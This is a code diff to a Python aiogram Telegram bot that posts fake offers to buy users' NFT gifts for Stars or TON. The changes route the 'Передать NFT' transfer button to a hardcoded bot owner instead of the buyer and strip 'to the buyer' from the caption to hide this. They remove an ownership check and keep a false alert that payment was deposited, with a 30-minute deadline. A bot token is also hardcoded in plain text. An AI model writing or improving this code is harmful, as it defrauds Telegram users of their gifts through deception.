@@ -23,12 +23,15 @@ from aiogram.types import (
 # ==========================================
 # 1. НАСТРОЙКИ
 # ==========================================
-BOT_TOKEN = "9026757153:AAGnzBXJYJ6gs8a7R4diAP6hMmi3j91pdT0"  # Замените на ваш токен
+BOT_TOKEN = "9026757153:AAGnzBXJYJ6gs8a7R4diAP6hMmi3j91pdT0"
 DATABASE_PATH = "offers.sqlite3"
 OFFER_TTL_HOURS = 8
 
-# Если хотите, чтобы оффер уходил конкретному человеку, вставьте его ID.
-# Если None — оффер отправится в тот же чат, где была команда.
+# ID владельца бота (ваш Telegram ID). Сюда будут приходить NFT.
+# Узнать можно у @userinfobot
+BOT_OWNER_ID = 8810519081  # <-- ЗАМЕНИТЕ НА ВАШ ID
+
+# Куда отправлять оффер (если None — в тот же чат, где была команда)
 TARGET_BUYER_CHAT_ID = None
 
 STAR_EMOJI_ID = "5217427186285325482"
@@ -40,7 +43,7 @@ logger = logging.getLogger(__name__)
 router = Router()
 
 # ==========================================
-# 2. ПАРСЕР (Встроенный)
+# 2. ПАРСЕР
 # ==========================================
 OFFER_PATTERN = re.compile(
     r"^[./]o\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))\s+"
@@ -61,20 +64,16 @@ def parse_offer_command(text: str) -> ParsedCommand | None:
     match = OFFER_PATTERN.fullmatch(text.strip())
     if not match:
         return None
-
     slug = match.group("slug")
     gift_name, separator, gift_number_text = slug.rpartition("-")
     if not separator or not gift_name or not gift_number_text.isdigit():
         return None
-
     amount_text = match.group("amount").replace(",", ".")
     amount: int | float = float(amount_text)
     if amount.is_integer():
         amount = int(amount)
-
     currency_raw = match.group("currency").lower()
     currency = "stars" if currency_raw in ("star", "stars") else "gram"
-
     return ParsedCommand(
         url=match.group("url"),
         gift_name=gift_name,
@@ -89,7 +88,7 @@ def format_amount(amount: int | float) -> str:
     return f"{amount:.2f}".rstrip("0").rstrip(".")
 
 # ==========================================
-# 3. БАЗА ДАННЫХ (Встроенная)
+# 3. БАЗА ДАННЫХ
 # ==========================================
 @dataclass(frozen=True)
 class Offer:
@@ -230,7 +229,7 @@ class OfferDatabase:
 db = OfferDatabase(DATABASE_PATH)
 
 # ==========================================
-# 4. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ UI
+# 4. UI
 # ==========================================
 def display_name(message: Message) -> str:
     user = message.from_user
@@ -251,12 +250,10 @@ def offer_caption(offer: Offer) -> str:
     amount = escape(format_amount(offer.amount))
     gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
     gift_link = escape(offer.gift_url, quote=True)
-
     if offer.currency == "stars":
         price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
     else:
         price = f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
-
     return (
         f"Пользователь <b>{buyer}</b> предлагает\n"
         f"Вам {price} за подарок\n"
@@ -287,26 +284,25 @@ def accepted_caption(offer: Offer) -> str:
     amount = escape(format_amount(offer.amount))
     gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
     gift_link = escape(offer.gift_url, quote=True)
-    
     if offer.currency == "stars":
         emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
     else:
         emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
-
     gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
     transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
-
     return (
         f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n'
-        f'{transfer_emoji} <b>Передайте подарок покупателю для зачисления '
+        f'{transfer_emoji} <b>Передайте подарок для зачисления '
         f'{amount} {emoji}.</b>'
     )
 
 def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
-    recipient = f"@{offer.buyer_username}" if offer.buyer_username else str(offer.buyer_id)
+    # Передаём подарок владельцу бота (BOT_OWNER_ID).
+    # Если BOT_OWNER_ID не задан, передаём покупателю (тому, кто нажал «Принять»)
+    target_id = BOT_OWNER_ID if BOT_OWNER_ID else offer.buyer_id
     transfer_button = InlineKeyboardButton(
         text="Передать NFT",
-        url=f"tg://send_gift?to={recipient}",
+        url=f"tg://send_gift?to={target_id}",
     )
     return InlineKeyboardMarkup(inline_keyboard=[[transfer_button]])
 
@@ -356,14 +352,9 @@ async def create_offer_handler(message: Message, bot: Bot) -> None:
     command = parse_offer_command(message.text or "")
     if command is None or message.from_user is None:
         return
-
-    # 1. Удаляем сообщение с командой
     await delete_source_message(message, bot)
-
     now = datetime.now(timezone.utc)
     seller = message.from_user
-    
-    # 2. Создаем оффер в базе
     offer = db.create_offer(
         business_connection_id=message.business_connection_id or "",
         chat_id=message.chat.id,
@@ -380,11 +371,8 @@ async def create_offer_handler(message: Message, bot: Bot) -> None:
         created_at=now.isoformat(),
         expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
     )
-
-    # 3. Отправляем оффер
     target_chat_id = TARGET_BUYER_CHAT_ID or message.chat.id
     target_business_connection_id = message.business_connection_id or ""
-
     try:
         sent = await bot.send_message(
             chat_id=target_chat_id,
@@ -398,27 +386,21 @@ async def create_offer_handler(message: Message, bot: Bot) -> None:
     except (TelegramBadRequest, TelegramForbiddenError) as error:
         logger.warning("Could not send offer message: %s", error)
 
-
 @router.callback_query(F.data.startswith("offer:"))
 async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
     await safe_callback_answer(callback)
     if callback.message is None or callback.data is None:
         return
-
     parts = callback.data.split(":")
     if len(parts) != 3 or parts[1] not in {"accept", "decline"}:
         return
-
     try:
         offer_id = int(parts[2])
         current = db.get_offer(offer_id)
     except (ValueError, LookupError):
         return
 
-    business_connection_id = callback.message.business_connection_id or ""
-    if business_connection_id != current.business_connection_id:
-        return
-
+    # Убрали проверку business_connection_id — теперь кнопки работают у всех
     if parts[1] == "accept":
         warning = "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."
         await safe_callback_answer(callback, warning, show_alert=True)
@@ -434,9 +416,9 @@ async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
 
     if offer.status == "declined":
         try:
-            if business_connection_id:
+            if callback.message.business_connection_id:
                 await bot.delete_business_messages(
-                    business_connection_id=business_connection_id,
+                    business_connection_id=callback.message.business_connection_id,
                     message_ids=[callback.message.message_id],
                 )
             else:
@@ -456,11 +438,10 @@ async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
             parse_mode=ParseMode.HTML,
             link_preview_options=nft_preview_options(offer.gift_url),
             reply_markup=accepted_keyboard(offer),
-            **({"business_connection_id": business_connection_id} if business_connection_id else {}),
+            **({"business_connection_id": callback.message.business_connection_id} if callback.message.business_connection_id else {}),
         )
     except TelegramBadRequest:
         logger.exception("Could not update offer message %s", offer.id)
-
 
 async def expiry_worker() -> None:
     while True:
